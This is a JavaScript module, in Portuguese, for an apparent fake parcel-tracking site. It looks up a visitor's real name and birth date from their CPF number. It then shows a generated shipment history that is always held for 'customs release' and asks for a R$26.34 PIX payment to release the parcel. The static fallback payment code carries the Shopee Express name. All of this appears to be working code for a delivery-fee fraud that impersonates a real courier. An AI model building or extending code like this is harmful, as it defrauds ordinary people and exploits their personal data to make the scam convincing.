/**
 * Sistema principal de rastreamento - VERSÃO ATUALIZADA COM ZENTRA PAY OFICIAL
 */
import { DataService } from '../utils/data-service.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { UIHelpers } from '../utils/ui-helpers.js';

export class TrackingSystem {
    constructor() {
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.currentCPF = null;
        this.userData = null;
        this.trackingData = null;
        this.isInitialized = false;
        this.pixData = null;
        this.liberationPaid = false;
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🚀 Inicializando sistema de rastreamento');
        
        try {
            this.setupCPFInput();
            this.setupTrackingForm();
            this.setupOrderDetailsAccordion();
            this.setupModalEvents();
            this.checkURLParams();
            
            this.isInitialized = true;
            console.log('✅ Sistema de rastreamento inicializado');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) return;

        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
        });

        cpfInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });
    }

    setupTrackingForm() {
        const form = document.getElementById('trackingForm');
        const button = document.getElementById('trackButton');

        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }

        if (button) {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }
    }

    async handleTrackingSubmit() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButton = document.getElementById('trackButton');
        
        if (!cpfInput || !trackButton) return;

        const cpf = cpfInput.value.trim();
        
        if (!cpf) {
            UIHelpers.showError('Por favor, digite um CPF');
            return;
        }

        if (!CPFValidator.isValidCPF(cpf)) {
            UIHelpers.showError('CPF inválido. Verifique os dados digitados.');
            return;
        }

        this.currentCPF = CPFValidator.cleanCPF(cpf);
        
        trackButton.disabled = true;
        trackButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Rastreando...';

        UIHelpers.showLoadingNotification();

        try {
            console.log('🔍 Buscando dados para CPF:', this.currentCPF);
            
            const data = await this.dataService.fetchCPFData(this.currentCPF);
            
            if (data && data.DADOS) {
                this.userData = {
                    nome: data.DADOS.nome,
                    cpf: this.currentCPF,
                    nascimento: data.DADOS.data_nascimento,
                    situacao: 'REGULAR'
                };

                console.log('✅ Dados obtidos:', this.userData);
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                UIHelpers.closeLoadingNotification();
                
                this.displayOrderDetails();
                this.generateTrackingData();
                this.displayTrackingResults();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    UIHelpers.scrollToElement(orderDetails, 100);
                }

                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1500);
                
            } else {
                throw new Error('Dados não encontrados');
            }
            
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError('Erro ao buscar dados. Tente novamente.');
        } finally {
            trackButton.disabled = false;
            trackButton.innerHTML = '<i class="fas fa-search"></i> Rastrear Pacote';
        }
    }

    displayOrderDetails() {
        if (!this.userData) return;

        const orderDetails = document.getElementById('orderDetails');
        const customerName = document.getElementById('customerName');
        const fullName = document.getElementById('fullName');
        const formattedCpf = document.getElementById('formattedCpf');

        if (orderDetails) {
            orderDetails.style.display = 'block';
        }

        if (customerName) {
            customerName.textContent = this.userData.nome.split(' ')[0];
        }

        if (fullName) {
            fullName.textContent = this.userData.nome;
        }

        if (formattedCpf) {
            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
        }
    }

    generateTrackingData() {
        this.trackingData = TrackingGenerator.generateTrackingData(this.userData);
    }

    displayTrackingResults() {
        const trackingResults = document.getElementById('trackingResults');
        const customerNameStatus = document.getElementById('customerNameStatus');
        const currentStatus = document.getElementById('currentStatus');
        const trackingTimeline = document.getElementById('trackingTimeline');

        if (trackingResults) {
            trackingResults.style.display = 'block';
        }

        if (customerNameStatus) {
            customerNameStatus.textContent = this.userData.nome.split(' ')[0];
        }

        if (currentStatus) {
            currentStatus.textContent = 'Aguardando liberação aduaneira';
        }

        if (trackingTimeline) {
            this.renderTimeline(trackingTimeline);
        }

        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    renderTimeline(container) {
        container.innerHTML = '';

        this.trackingData.steps.forEach((step, index) => {
            const timelineItem = this.createTimelineItem(step, index);
            container.appendChild(timelineItem);
        });
    }

    createTimelineItem(step, index) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        
        if (index === 0) {
            item.classList.add('first');
        }

        const dateFormatted = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeFormatted = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        if (step.needsLiberation) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-liberation-button>
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateFormatted}</span>
                    <span class="time">${timeFormatted}</span>
                </div>
                <div class="timeline-text">
                    <p>
                        ${step.isChina ? '<span class="china-tag">[China]</span>' : ''}
                        ${step.description}
                    </p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        return item;
    }

    highlightLiberationButton() {
        // Buscar botões usando múltiplos seletores
        const selectors = [
            '[data-liberation-button]',
            '.liberation-button-timeline'
        ];

        let liberationButton = null;

        for (const selector of selectors) {
            liberationButton = document.querySelector(selector);
            if (liberationButton) break;
        }

        // Fallback: buscar por texto
        if (!liberationButton) {
            const allButtons = Array.from(document.querySelectorAll('button'));
            liberationButton = allButtons.find(btn => 
                btn.textContent && btn.textContent.includes('LIBERAR')
            );
        }

        if (liberationButton) {
            console.log('🔓 Botão de liberação encontrado');
            
            this.setupLiberationButton(liberationButton);
            
            setTimeout(() => {
                liberationButton.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
            }, 500);
        } else {
            console.warn('⚠️ Botão de liberação não encontrado');
        }
    }

    setupLiberationButton(button) {
        button.addEventListener('click', () => {
            this.showLiberationModal();
        });

        button.style.animation = 'pulse 2s infinite';
        button.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.6)';
    }

    async showLiberationModal() {
        console.log('🔓 Abrindo modal de liberação');
        
        const modal = document.getElementById('liberationModal');
        if (!modal) return;

        try {
            console.log('🚀 Gerando PIX via Zentra Pay...');
            
            const pixResult = await this.zentraPayService.createPixTransaction(
                this.userData, 
                26.34
            );

            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso!');
                this.pixData = pixResult;
                this.updateModalWithRealPix();
            } else {
                console.warn('⚠️ Erro ao gerar PIX, usando estático');
                this.updateModalWithStaticPix();
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX:', error);
            this.updateModalWithStaticPix();
        }

        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }

    updateModalWithRealPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');

        if (qrCodeImg && this.pixData.pixPayload) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
        }

        if (pixCodeTextarea && this.pixData.pixPayload) {
            pixCodeTextarea.value = this.pixData.pixPayload;
        }

        console.log('✅ Modal atualizado com PIX real');
    }

    updateModalWithStaticPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const staticPix = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';

        if (qrCodeImg) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(staticPix)}`;
        }

        if (pixCodeTextarea) {
            pixCodeTextarea.value = staticPix;
        }

        console.log('⚠️ Modal atualizado com PIX estático');
    }

    setupOrderDetailsAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');

        if (detailsHeader && detailsContent) {
            detailsHeader.addEventListener('click', () => {
                const isExpanded = detailsContent.classList.contains('expanded');
                
                if (isExpanded) {
                    detailsContent.classList.remove('expanded');
                    if (toggleIcon) toggleIcon.classList.remove('rotated');
                } else {
                    detailsContent.classList.add('expanded');
                    if (toggleIcon) toggleIcon.classList.add('rotated');
                }
            });
        }
    }

    setupModalEvents() {
        // Modal de liberação
        const closeModal = document.getElementById('closeModal');
        const copyPixButton = document.getElementById('copyPixButtonModal');
        const liberationModal = document.getElementById('liberationModal');

        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }

        if (copyPixButton) {
            copyPixButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }

        if (liberationModal) {
            liberationModal.addEventListener('click', (e) => {
                if (e.target === liberationModal) {
                    this.closeLiberationModal();
                }
            });
        }
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusCpf = urlParams.get('focus');
        
        if (focusCpf === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                }
            }, 500);
        }
    }

    setZentraPayApiSecret(apiSecret) {
        if (this.zentraPayService) {
            this.zentraPayService.setApiSecret(apiSecret);
        }
    }
}